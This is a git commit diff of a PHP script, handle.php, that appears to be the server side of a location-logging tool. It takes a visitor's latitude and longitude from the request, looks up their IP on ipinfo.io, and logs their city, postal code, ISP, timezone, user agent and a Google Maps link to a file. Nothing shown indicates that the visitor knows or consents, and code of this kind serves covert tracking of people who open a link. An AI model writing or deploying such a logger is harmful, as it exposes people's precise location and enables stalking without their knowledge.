019e74a6ceccaa9f5e89bdf54593bdbc5e1d555e
LukeProducts <lukeproducts@gmx.net>
2022-01-26 18:23:50 +0100

    Update handle.php

--- handle.php
+++ handle.php
@@ -14,17 +14,11 @@ if (isset($_GET["lat"]) && isset($_GET["lon"]) && isset($_GET["address"])){
     
     $ipinf = get("https://ipinfo.io/$ip/json");
 
-    if (!$ipinf["status"] == 404){
-        date_default_timezone_set($ipinf["timezone"]);
-        $infos = "REQUEST FROM " . $ip . " at " . date("H:i:s") . " [in " . $ipinf["timezone"] . "]" . "\nLatitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . 
-        "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nCountry Code: " . $ipinf["country"] . 
-        "\nTimezone: " . $ipinf["timezone"] . "\nState: " . $ipinf["region"] . 
-        "\nCity: ". $ipinf["postal"] . " " . $ipinf["city"] . "\nOrganization: " . $ipinf["org"] . "\nUser Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";
-    }
-    else{
-        $infos = "REQUEST FROM " . $_SERVER["REMOTE_ADDR"] . " at " . date("H:i:s") . "\nLatitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . 
-        "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nUser Agent: '" . $_SERVER['HTTP_USER_AGENT'] . "'\n\n";
-    }
+    date_default_timezone_set($ipinf["timezone"]);
+    $infos = "REQUEST FROM " . $ip . " at " . date("H:i:s") . " [in " . $ipinf["timezone"] . "]" . "\nLocation: " . $ipinf["loc"] . 
+    "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nCountry Code: " . $ipinf["country"] . 
+    "\nTimezone: " . $ipinf["timezone"] . "\nState: " . $ipinf["region"] . 
+    "\nCity: ". $ipinf["postal"] . " " . $ipinf["city"] . "\nOrganization: " . $ipinf["org"] . "\nUser Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";
     
     
     if (!file_exists($dir))
